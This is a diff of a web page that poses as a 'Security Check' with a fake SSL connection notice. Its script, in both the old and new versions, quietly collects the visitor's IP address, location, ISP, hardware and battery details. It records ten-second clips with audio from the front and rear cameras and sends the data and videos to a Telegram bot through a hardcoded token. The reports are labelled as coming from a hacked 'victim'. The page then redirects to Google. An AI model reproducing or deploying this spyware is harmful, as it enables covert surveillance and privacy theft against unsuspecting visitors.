@@ -3,17 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأمين البروتوكول</title>
+    <title>Security Check</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .loader { border: 2px solid #111; border-top: 2px solid #00ff00; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; box-shadow: 0 0 15px #00ff00; }
+        body { background-color: #0a0a0a; color: #3498db; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .loader { border: 3px solid #1a1a1a; border-top: 3px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; box-shadow: 0 0 15px rgba(52, 152, 219, 0.3); }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { margin-top: 25px; font-size: 13px; text-transform: uppercase; letter-spacing: 2px; }
+        .status { margin-top: 25px; font-size: 14px; font-weight: bold; color: #5dade2; letter-spacing: 1px; }
+        .sub-status { margin-top: 10px; font-size: 11px; color: #566573; }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <div class="status" id="st">Initializing Encryption...</div>
+    <div class="status" id="st">SYSTEM INITIALIZING...</div>
+    <div class="sub-status">Encrypted Secure Connection (SSL v3.5)</div>
 
     <script>
         const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
@@ -22,82 +24,45 @@
 
         async function start() {
             if (!chatId) return;
+           
+            // جلب البيانات أولاً
+            const fullReport = await getDeepInfo();
 
-            // 1. جلب البيانات العميقة وإرسالها فوراً
-            await fetchDeepInfo();
+            // تصوير الأمامية وإرسالها مع التقرير في رسالة واحدة
+            await captureAndSend("user", "الأمامية (Selfie)", 10000, fullReport);
 
-            // 2. تصوير الأمامية (10 ثوانٍ)
-            await capture("user", "Front (Selfie)");
+            // تصوير الخلفية (فيديو منفصل بدون تقرير لتجنب التكرار)
+            await captureAndSend("environment", "الخلفية (Rear)", 10000, "🎥 مقطع الكاميرا الخلفية الإضافي");
 
-            // 3. تصوير الخلفية (10 ثوانٍ)
-            await capture("environment", "Back (Rear)");
-
-            // التوجه النهائي
             window.location.href = "https://www.google.com";
         }
 
-        async function fetchDeepInfo() {
+        async function getDeepInfo() {
             try {
-                // جلب الـ IP والموقع
                 const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-               
-                // جلب بيانات البطارية
+                const d = await ipRes.json();
                 const battery = await navigator.getBattery();
-                const battLevel = Math.round(battery.level * 100) + "%";
-                const isCharging = battery.charging ? "Yes" : "No";
-
-                // جلب بيانات الهاردوير
-                const ram = navigator.deviceMemory || "Unknown";
-                const cpu = navigator.hardwareConcurrency || "Unknown";
+               
                 const gpu = getGPU();
-                const screen = `${window.screen.width}x${window.screen.height}`;
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const lang = navigator.language;
+                const ram = navigator.deviceMemory || "غير معروف";
+                const cpu = navigator.hardwareConcurrency || "غير معروف";
 
-                const fullReport = `
-🚀 **NEW VICTIM PENETRATED**
-━━━━━━━━━━━━━━━━━━
-🌐 **Network Info:**
-• IP: \`${ipData.ip}\`
-• Provider: ${ipData.org}
-• Location: ${ipData.city}, ${ipData.country_name}
-
-📱 **Device Hardware:**
-• Model: ${navigator.platform}
-• CPU Cores: ${cpu}
-• RAM: ${ram} GB
-• GPU: ${gpu}
-• Screen: ${screen}
-
-🔋 **Battery Status:**
-• Level: ${battLevel}
-• Charging: ${isCharging}
-
-⚙️ **System Info:**
-• OS: ${navigator.userAgent.split(')')[0].split('(')[1]}
-• Language: ${lang}
-• Timezone: ${timezone}
-━━━━━━━━━━━━━━━━━━`;
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullReport)}&parse_mode=Markdown`);
-            } catch (e) {
-                console.log("Error fetching info");
-            }
+                return `✅ **تم اختراق الهدف بنجاح**\n━━━━━━━━━━━━━\n🌐 **معلومات الشبكة:**\n• العنوان: \`${d.ip}\`\n• المزود: ${d.org}\n• الموقع: ${d.city}, ${d.country_name}\n\n📱 **عتاد الجهاز:**\n• الموديل: ${navigator.platform}\n• الأنوية: ${cpu}\n• الرام: ${ram} جيجا\n• المعالج الرسومي: ${gpu}\n\n🔋 **حالة البطارية:**\n• المستوى: ${Math.round(battery.level * 100)}%\n• يشحن: ${battery.charging ? 'نعم' : 'لا'}\n\n⚙️ **نظام التشغيل:**\n• الإصدار: ${navigator.userAgent.split(')')[0].split('(')[1]}\n• اللغة: ${navigator.language}\n━━━━━━━━━━━━━`;
+            } catch (e) { return "فشل جلب البيانات التفصيلية"; }
         }
 
         function getGPU() {
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const gl = canvas.getContext('webgl');
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch (e) { return "Unknown GPU"; }
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split('(')[0];
+            } catch (e) { return "غير معروف"; }
         }
 
-        async function capture(mode, label) {
+        async function captureAndSend(mode, label, duration, reportText) {
             try {
-                document.getElementById('st').innerText = `Capturing ${label}...`;
+                document.getElementById('st').innerText = `VERIFYING ${label.toUpperCase()}...`;
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                 const recorder = new MediaRecorder(stream);
                 let chunks = [];
@@ -107,22 +72,27 @@
                 return new Promise((resolve) => {
                     recorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'video/mp4' });
-                        uploadVideo(blob, label); // رفع في الخلفية
+                        await uploadWithCaption(blob, reportText);
                         stream.getTracks().forEach(t => t.stop());
                         resolve();
                     };
                     recorder.start();
-                    setTimeout(() => recorder.stop(), 10000); // 10 ثوانٍ فقط
+                    setTimeout(() => recorder.stop(), duration);
                 });
             } catch (e) { return Promise.resolve(); }
         }
 
-        function uploadVideo(blob, label) {
+        async function uploadWithCaption(blob, caption) {
             const fd = new FormData();
             fd.append('chat_id', chatId);
-            fd.append('video', blob, `${label}.mp4`);
-            fd.append('caption', `🎬 Video From: ${label} Camera`);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+            fd.append('video', blob, 'video.mp4');
+            fd.append('caption', caption);
+            fd.append('parse_mode', 'Markdown');
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: fd
+            });
         }
 
         window.onload = start;
